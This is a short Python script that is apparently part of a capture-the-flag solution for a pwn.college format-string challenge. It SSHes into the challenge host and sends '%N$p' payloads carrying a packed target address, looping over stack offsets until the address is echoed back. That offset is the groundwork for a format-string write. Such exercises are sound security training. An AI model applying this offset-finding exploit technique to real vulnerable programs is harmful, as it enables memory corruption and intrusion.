import subprocess
import struct

ADDR = 0x4040E0
TOTAL = 0x79
SENTINEL = "XYZ "
prefix = "A" * (TOTAL - len(SENTINEL)) + SENTINEL
SSH = [
    "ssh",
    "-i",
    "../key",
    "hacker@dojo.pwn.college",
    "/challenge/babyfmt_level4.1",
]

pad = 4
pad_bytes = b"A" * pad

for idx in range(30, 120):
    fmt = f"{prefix}%{idx}$p".encode()
    payload = fmt + pad_bytes + struct.pack("<Q", ADDR)
    res = subprocess.run(SSH, input=payload, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    out = res.stdout.decode("latin-1", errors="ignore")
    if "0x4040e0" in out:
        print("found idx", idx)
        print(out)
        break
else:
    print("not found for pad 4 in tested range")
